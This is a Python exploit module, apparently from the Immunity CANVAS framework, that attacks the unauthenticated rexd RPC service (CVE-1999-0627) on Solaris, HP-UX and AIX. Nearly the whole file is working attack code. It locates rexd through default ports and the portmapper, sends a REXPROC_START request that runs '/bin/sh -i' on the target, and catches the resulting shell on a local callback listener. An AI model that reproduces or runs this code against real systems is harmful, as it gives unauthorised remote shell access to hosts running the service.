#! /usr/bin/env python

#
# CANVAS sadmind exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import os,getopt
import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import socket
from exploitutils import *
sys.path.append('encoder')
import addencoder
sys.path.append("shellcode")
sys.path.append("gui")
import win32shell
from tcpexploit import tcpexploit
import canvasengine
import time
from sunrpc import *

from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromsocket
from libs.rpc import Packer, Unpacker, TCPClient

BDPORT=1524

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Unix"
DOCUMENTATION["Notes"]="Rexd doesn't do any authentication. This is a known problem"
DOCUMENTATION["CVE Name"] = "CVE-1999-0627"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0627"
DOCUMENTATION['CVSS'] = 0.0


DESCRIPTION="Rexd remote \"exploit\""
NAME="rexd"
VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Solaris"], ["HP-UX"], ["AIX"] ]


GTK2_DIALOG="dialog.glade2"

NOTES=""" 

"""

CHANGELOG="""

"""

REXD_PROGRAM=100017
REXD_VERSION=1
REXD_PROC=1
REXD_PROTO="tcp"
REXPROC_START=1
REXPROC_WAIT=2
REXPROC_MODES=3
REXPROC_WINCH=4
REXPROC_SIGNAL=5


PING=0


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit
"""
IBM AIX: 3.1 3.2
"""
class rex_start(Packer):
    def __init__(self):
        Packer.__init__(self)
        self.rst_cmd=[] #array of strings
        self.rst_host=""
        self.rst_fsname=""
        self.rst_dirwithin=""
        self.rst_env=[]
        self.rst_port0=0
        self.rst_port1=0
        self.rst_port2=0
        self.rst_flags=0
        return
        
    def packme(self):
        self.pack_stringarray(self.rst_cmd)
        self.pack_string(self.rst_host)
        self.pack_string(self.rst_fsname)
        self.pack_string(self.rst_dirwithin)
        self.pack_stringarray(self.rst_env)
        self.pack_uint(self.rst_port0)
        self.pack_uint(self.rst_port1)
        self.pack_uint(self.rst_port2)
        self.pack_uint(self.rst_flags)
        return

    def packother(self,other):
        self.pack_stringarray(self.rst_cmd)
        self.pack_string(self.rst_host)
        self.pack_string(self.rst_fsname)
        self.pack_string(self.rst_dirwithin)
        self.pack_stringarray(self.rst_env)
        self.pack_uint(self.rst_port0)
        self.pack_uint(self.rst_port1)
        self.pack_uint(self.rst_port2)
        self.pack_uint(self.rst_flags)
        return
    
class rex_result(Unpacker):
    def __init__(self,buffer=""):
        Unpacker.__init__(self,buffer)
        self.rlt_stat=0
        self.rlt_message=""
        return
    
    def unpackme(self):
        self.rtl_stat=self.unpack_uint()
        self.rtl_message=self.unpack_string()
        return
    
class rexd_packer(Packer):
    def __init__(self):
        Packer.__init__(self)        
        return
    
    def pack_rex_start(self,rexstart):
        rexstart.packme()
        self.set_buf(self.get_buf()+rexstart.get_buf())
        print "len=%d"%len(self.buf)
        return 

class rexd_unpacker(Unpacker):
    def __init__(self,buffer):
        Unpacker.__init__(self,buffer)
        return
    
    def unpack_rex_result(self):
        print "Len=%d"%len(self.buf)
        myrexresult=rex_result()
        myrexresult.reset(self.get_buf())
        myrexresult.unpackme()
        self.myrexresult=myrexresult
        self.reset("")
        return myrexresult
    
class rexd_client(TCPClient):
    def __init__(self,target,port=0,getsock=None):
        TCPClient.__init__(self,target,REXD_PROGRAM,REXD_VERSION,port,getsock=getsock)
        
        return
    
    
    def addpackers(self):
        self.packer = rexd_packer()
        self.unpacker = rexd_unpacker("")

    def mkcred(self):
        import random
        import libs.rpc as rpc
        self.cred = rpc.AUTH_UNIX, rpc.make_auth_unix(random.randint(1,99999),\
                                                      "localhost", 0, 0, [])
        return self.cred

    def rexd_start(self,rex_start):
        packer=rexd_packer()
        self.make_call(REXPROC_START,rex_start,
                       self.packer.pack_rex_start,self.unpacker.unpack_rex_result)
        return self.unpacker.myrexresult
    
        

def rexd_ping(host,port):
    try:
        myrexd=rexd_client(host,port)
        myrexd.call_0()
    except RuntimeError:
        return 0
    return 1




class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        #list of potential rexd ports to check first
        self.portlist=[800,801,802]
        self.port=0
        self.host=""
        self.shellcode="\xcc" * 298
        self.badstring=""
        self.searchbadstring=".,:;\x00\x0a\x0d+\"\x2f\x5c\x09\x0e\x0b"
        self.ssl=0
        self.setVersions()
        self.version=1
        #self.command="/usr/bin/touch /tmp/CANVASWORKED;"
        self.command=""
        self.attackhost="CANVAS"
        self.attackdomain=""
        self.rcv_port=11012
        self.name=NAME        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[0]=("Almost Any Solaris",None)
            
    def setup(self):
        try:
            rexd_client(self.target)
        except (socket.error, RuntimeError), self.err:
            return 0
        return 1

    def test(self):
        """
        Sees if it can find rexd on a port
        """
        self.port=int(self.argsDict.get("port",self.port))
        self.host=self.target.interface

        port=self.port
        if port==0:
            try:
                #try a few default ports first
                for p in self.portlist:
                    try:
                        self.log("Trying rexd on port %d"%p)
                        if rexd_ping(self.host,p):
                            self.log("Found rexd on port %d"%p)
                            port=p
                            break
                    except:
                        import traceback
                        pass
                        #traceback.print_exc(file=sys.stdout)

                if port==0:        
                    #go to the portmapper if we haven't found it yet
                    port=SRPCgetport(self.host,REXD_PROGRAM,REXD_VERSION,REXD_PROTO,getsock=self)
                    self.log("portmapper returned %d"%port)
            except:
                pass

        if port==0 or port==None:
            self.log("Not able to automatically get the port.")
            return 0
        self.log("Found port %d"%port)
        self.port=port
        return 1
        
    def run(self):
        self.port=int(self.argsDict.get("port",self.port))
        self.host=self.target.interface
        self.setInfo("%s attacking %s"%(NAME,self.host))
        port=self.port
        self.rcv_port=int(self.argsDict.get("callback", self.rcv_port))
            
        if port==0:
            try:
                #try a few default ports first
                for p in self.portlist:
                    try:
                        self.log("Trying rexd on port %d"%p)
                        if rexd_ping(self.host,p):
                            self.log("Found rexd on port %d"%p)
                            port=p
                            break
                    except:
                        import traceback
                        pass
                        #traceback.print_exc(file=sys.stdout)

                if port==0:        
                    #go to the portmapper if we haven't found it yet
                    self.log("Going to portmapper to find port...")
                    port=SRPCgetport(self.host,REXD_PROGRAM,REXD_VERSION,REXD_PROTO,getsock=self)
                    self.log("Portmapper query returned %d"%port)
                    if not rexd_ping(self.host,port):
                            self.log("Portmapper found rexd on port %d but it is not responding"%p)
                            port=0
                            
            except:
                pass

        if port in [0, None]:
            self.log("Not able to automatically get the port.")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,int(self.port)))
            return 0
        
        self.port=port # possible self.port = None here, fixed above

        try:
            myrexd=rexd_client(self.host,self.port)
        except:
            self.log("Unable to connect to rexd")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,int(self.port)))
            return 0
        
        #set up a listener on the rcv_port
        listenhost=""
        listenport=self.rcv_port
        s=self.gettcplistener(listenport,listenhost)
        if s==0: 
            self.log("Could not listen on port %d"%self.rcv_port)
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        self.log("Listening on port %d"%self.rcv_port)
   
        myrex_start=rex_start()
        myrex_start.rst_cmd=["/bin/sh","-i"]
        myrex_start.rst_env=["PS=CANVAS$ "]
        myrex_start.rst_host=self.host
        myrex_start.rst_port0=self.rcv_port
        myrex_start.rst_port1=self.rcv_port
        myrex_start.rst_port2=self.rcv_port
        result=myrexd.rexd_start(myrex_start)
        if result.rlt_stat!=0:
            self.log("Result=%d:*%s*"%(result.rlt_stat,result.rtl_message))
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        self.log("Rexd reported success...")

        try:
            (s2,addr)=s.accept()
            s2.set_timeout(2)
        except:
            self.log("Accept failed on listening socket - target most likely could not get back to you.")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        
        try:
            shell=shelllistener(shellfromsocket(s2),logfunction=self.logfunction)
        except :
            import traceback
            traceback.print_exc(file=sys.stdout)
            self.log("Could not make a shell listener - connection was closed. Exploit most likely failed.")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            import traceback
            print '-'*60
            traceback.print_exc(file=sys.stdout)
            print '-'*60
            return 0
        from unixShellNode import unixShellNode

        node=unixShellNode()
        node.parentnode=self.argsDict["passednodes"][0]        
        node.shell=shell
        self.setInfo("%s attacking %s:%d - done (succeeded!)"%(NAME,self.host,self.port))
        #self.log("[*] Registering new shell listener on %s!"%self.engine)
        return node

    def usage(self):
        print "Usage: %s -t host -O callback:portnumber"%sys.argv[0]

if __name__ == '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [1,0,None]:
        ret.interact()
        
